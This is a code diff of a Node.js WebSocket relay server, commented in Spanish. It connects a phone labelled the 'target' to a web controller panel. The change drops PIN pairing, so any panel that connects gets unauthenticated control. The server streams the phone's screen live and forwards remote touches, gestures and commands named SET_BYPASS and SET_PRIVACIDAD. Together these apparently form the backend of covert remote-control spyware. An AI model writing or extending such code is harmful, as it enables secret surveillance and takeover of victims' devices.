@@ -10,82 +10,82 @@ const wss = new WebSocket.Server({ server });
 // Servir archivos estáticos (el panel web en public/)
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Almacén de dispositivos objetivo: { pin: { phoneWs, webWs, width, height } }
-const objetivos = {};
-
-function generarPIN() {
-  return Math.floor(1000 + Math.random() * 9000).toString();
-}
+// Instancias globales para conexión única directa (sin PIN)
+let celularObjetivo = null;
+let panelWebControlador = null;
 
 wss.on('connection', (ws) => {
-  let pinAsignado = null;
   let tipoCliente = null; // 'CELULAR' o 'WEB'
 
   ws.on('message', (message) => {
     try {
       const data = JSON.parse(message);
 
-      // 1. EL CELULAR SOLICITA UN PIN Y REGISTRA SU RESOLUCIÓN
-      if (data.type === 'SOLICITAR_PIN_OBJETIVO') {
+      // 1. EL CELULAR SE REGISTRA AUTOMÁTICAMENTE COMO OBJETIVO
+      if (data.type === 'REGISTRAR_OBJETIVO') {
         tipoCliente = 'CELULAR';
-        pinAsignado = generarPIN();
-        
-        objetivos[pinAsignado] = {
-          phoneWs: ws,
-          webWs: null, // Se asignará cuando la PC se conecte
-          width: data.width || 1080,
-          height: data.height || 2400
-        };
+        celularObjetivo = ws;
+        celularObjetivo.width = data.width || 1080;
+        celularObjetivo.height = data.height || 2400;
 
-        ws.send(JSON.stringify({
-          type: 'PIN_ASIGNADO',
-          pin: pinAsignado
-        }));
-        console.log(`[CELULAR CONECTADO] PIN: ${pinAsignado} | Resolución: ${data.width}x${data.height}`);
-      }
+        console.log(`[CELULAR CONECTADO] Resolución registrada: ${celularObjetivo.width}x${celularObjetivo.height}`);
 
-      // 2. LA WEB O CONTROLADOR SE CONECTA USANDO EL PIN
-      else if (data.type === 'CONECTAR_DESDE_WEB') {
-        tipoCliente = 'WEB';
-        pinAsignado = data.pin;
-        const objetivo = objetivos[pinAsignado];
-
-        if (objetivo) {
-          objetivo.webWs = ws; // Guardamos la conexión de la PC
-          ws.send(JSON.stringify({
+        // Si la web ya estaba esperando, le avisamos de inmediato que hay conexión exitosa
+        if (panelWebControlador && panelWebControlador.readyState === WebSocket.OPEN) {
+          panelWebControlador.send(JSON.stringify({
             type: 'CONEXION_EXITOSA',
-            width: objetivo.width,
-            height: objetivo.height
-          }));
-          console.log(`[PANEL WEB CONECTADO] Vinculado al PIN: ${pinAsignado}`);
-        } else {
-          ws.send(JSON.stringify({
-            type: 'ERROR',
-            mensaje: 'PIN no encontrado o dispositivo desconectado'
+            width: celularObjetivo.width,
+            height: celularObjetivo.height
           }));
         }
       }
 
-      // 3. REENVIAR ACCIONES TÁCTILES (DEL WEB AL CELULAR)
-      else if (data.type === 'ENVIAR_TOQUE' || data.type === 'ENVIAR_GESTO' || data.type === 'PING') {
-        const objetivo = objetivos[data.pin];
-        if (objetivo && objetivo.phoneWs && objetivo.phoneWs.readyState === WebSocket.OPEN) {
-          objetivo.phoneWs.send(JSON.stringify(data));
+      // 2. EL PANEL WEB SE CONECTA DE FORMA AUTOMÁTICA
+      else if (data.type === 'CONECTAR_DESDE_WEB_AUTO') {
+        tipoCliente = 'WEB';
+        panelWebControlador = ws;
+
+        if (celularObjetivo && celularObjetivo.readyState === WebSocket.OPEN) {
+          ws.send(JSON.stringify({
+            type: 'CONEXION_EXITOSA',
+            width: celularObjetivo.width,
+            height: celularObjetivo.height
+          }));
+          console.log(`[PANEL WEB CONECTADO] Vinculado automáticamente al celular.`);
+        } else {
+          ws.send(JSON.stringify({
+            type: 'ERROR',
+            mensaje: 'Esperando a que el celular se conecte...'
+          }));
+          console.log(`[PANEL WEB CONECTADO] Esperando celular objetivo...`);
+        }
+      }
+
+      // 3. REENVIAR ACCIONES TÁCTILES Y COMANDOS DE CONTROL (DEL WEB AL CELULAR)
+      else if (
+        data.type === 'ENVIAR_TOQUE' || 
+        data.type === 'ENVIAR_GESTO' || 
+        data.type === 'SET_BYPASS' || 
+        data.type === 'SET_BOTONES' || 
+        data.type === 'SET_PRIVACIDAD' ||
+        data.accion
+      ) {
+        if (celularObjetivo && celularObjetivo.readyState === WebSocket.OPEN) {
+          celularObjetivo.send(message);
         }
       }
 
       // 4. REENVIAR STREAM DE VIDEO (DEL CELULAR AL WEB) OPTIMIZADO PARA FLUJO EN TIEMPO REAL
       else if (data.type === 'STREAM_FRAME') {
-        const objetivo = objetivos[data.pin];
-        if (objetivo && objetivo.webWs && objetivo.webWs.readyState === WebSocket.OPEN) {
+        if (panelWebControlador && panelWebControlador.readyState === WebSocket.OPEN) {
           
           // Filtro de fluidez: si hay más de 64KB acumulados en la cola de red de la PC,
-          // descartamos este frame para que nunca se atrase el video.
-          if (objetivo.webWs.bufferedAmount > 65536) {
+          // descartamos este frame para que nunca se atrase el video (cámara lenta).
+          if (panelWebControlador.bufferedAmount > 65536) {
             return;
           }
 
-          objetivo.webWs.send(JSON.stringify({
+          panelWebControlador.send(JSON.stringify({
             type: 'STREAM_FRAME',
             frame: data.frame
           }));
@@ -97,16 +97,19 @@ wss.on('connection', (ws) => {
   });
 
   ws.on('close', () => {
-    if (pinAsignado && objetivos[pinAsignado]) {
-      if (tipoCliente === 'CELULAR') {
-        console.log(`[CELULAR DESCONECTADO] PIN ${pinAsignado} liberado.`);
-        delete objetivos[pinAsignado];
-      } else if (tipoCliente === 'WEB') {
-        console.log(`[PANEL WEB DESCONECTADO] Del PIN ${pinAsignado}.`);
-        if (objetivos[pinAsignado]) {
-          objetivos[pinAsignado].webWs = null;
-        }
+    if (tipoCliente === 'CELULAR') {
+      console.log(`[CELULAR DESCONECTADO] Sesión liberada.`);
+      celularObjetivo = null;
+      // Notificar a la web si está abierta
+      if (panelWebControlador && panelWebControlador.readyState === WebSocket.OPEN) {
+        panelWebControlador.send(JSON.stringify({
+          type: 'ERROR',
+          mensaje: 'El celular se ha desconectado.'
+        }));
       }
+    } else if (tipoCliente === 'WEB') {
+      console.log(`[PANEL WEB DESCONECTADO].`);
+      panelWebControlador = null;
     }
   });
 });
